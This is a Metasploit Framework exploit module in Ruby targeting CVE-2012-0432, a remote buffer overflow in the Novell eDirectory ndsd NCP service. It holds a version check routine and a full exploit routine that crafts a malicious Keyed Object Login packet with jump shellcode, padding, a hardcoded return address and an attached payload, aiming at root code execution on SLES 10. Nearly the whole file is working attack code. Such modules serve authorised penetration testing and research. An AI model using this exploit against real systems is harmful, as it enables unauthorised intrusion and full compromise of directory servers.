# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;            => &#039;Novell eDirectory 8 Buffer Overflow&#039;,
			&#039;Description&#039;     => %q{
					This exploit abuses a buffer overflow vulnerability in Novell eDirectory. The
				vulnerability exists in the ndsd daemon, specifically in the NCP service, while
				parsing a specially crafted Keyed Object Login request. It allows remote code
				execution with root privileges.
			},
			&#039;Author&#039;          =>
				[
					&#039;David Klein&#039;, # Vulnerability Discovery
					&#039;Gary Nilson&#039;, # Exploit
					&#039;juan vazquez&#039; # Metasploit module
				],
			&#039;References&#039;      =>
				[
					[ &#039;CVE&#039;, &#039;2012-0432&#039;],
					[ &#039;OSVDB&#039;, &#039;88718&#039;],
					[ &#039;BID&#039;, &#039;57038&#039; ],
					[ &#039;EDB&#039;, &#039;24205&#039; ],
					[ &#039;URL&#039;, &#039;http://www.novell.com/support/kb/doc.php?id=3426981&#039; ],
					[ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2013/Jan/97&#039; ]
				],
			&#039;DisclosureDate&#039;  => &#039;Dec 12 2012&#039;,
			&#039;Platform&#039;        => &#039;linux&#039;,
			&#039;Privileged&#039;      => true,
			&#039;Arch&#039;            => ARCH_X86,
			&#039;Payload&#039;         =>
				{

				},
			&#039;Targets&#039;         =>
				[
					[ &#039;Novell eDirectory 8.8.7 v20701.33/ SLES 10 SP3&#039;,
						{
							&#039;Ret&#039; => 0x080a4697, # jmp esi from ndsd
							&#039;Offset&#039; => 58
						}
					]
				],
			&#039;DefaultTarget&#039;   => 0
		))

		register_options([Opt::RPORT(524),], self.class)
	end

	def check
		connect
		sock.put(connection_request)
		res = sock.get
		disconnect
		if res.nil? or res[8, 2].unpack("n")[0] != 0x3333 or res[15, 1].unpack("C")[0] != 0
			# res[8,2] => Reply Type
			# res[15,1] => Connection Status
			return Exploit::CheckCode::Safe
		end
		return Exploit::CheckCode::Detected
	end

	def connection_request
		pkt =  "\x44\x6d\x64\x54" # NCP TCP id
		pkt << "\x00\x00\x00\x17" # request_size
		pkt << "\x00\x00\x00\x01" # version
		pkt << "\x00\x00\x00\x00" # reply buffer size
		pkt << "\x11\x11"         # cmd => create service connection
		pkt << "\x00"             # sequence number
		pkt << "\x00"             # connection number
		pkt << "\x00"             # task number
		pkt << "\x00"             # reserved
		pkt << "\x00"             # request code

		return pkt
	end

	def exploit

		connect

		print_status("Sending Service Connection Request...")
		sock.put(connection_request)
		res = sock.get
		if res.nil? or res[8, 2].unpack("n")[0] != 0x3333 or res[15, 1].unpack("C")[0] != 0
			# res[8,2] => Reply Type
			# res[15,1] => Connection Status
			fail_with(Exploit::Failure::UnexpectedReply, "Service Connection failed")
		end
		print_good("Service Connection successful")

		pkt = "\x44\x6d\x64\x54"  # NCP TCP id
		pkt << "\x00\x00\x00\x00" # request_size (filled later)
		pkt << "\x00\x00\x00\x01" # version (1)
		pkt << "\x00\x00\x00\x05" # reply buffer size
		pkt << "\x22\x22"         # cmd
		pkt << "\x01"             # sequence number
		pkt << res[11]            # connection number
		pkt << "\x00"             # task number
		pkt << "\x00"             # reserved
		pkt << "\x17"             # Login Object FunctionCode (23)
		pkt << "\x00\xa7"         # SubFuncStrucLen
		pkt << "\x18"             # SubFunctionCode
		pkt << "\x90\x90"         # object type
		pkt << "\x50"             # ClientNameLen
		pkt << rand_text(7)
		jmp_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+#{target[&#039;Offset&#039;] + 4}").encode_string
		pkt << jmp_payload # first byte is the memcpy length, must be bigger than 62 to to overwrite EIP
		pkt << rand_text(target[&#039;Offset&#039;] - jmp_payload.length)
		pkt << [target.ret].pack("V")
		pkt << payload.encoded

		pkt[4,4] = [pkt.length].pack("N")

		print_status("Sending Overflow on Keyed Object Login...")
		sock.put(pkt)
		sock.get
		disconnect
	end

end

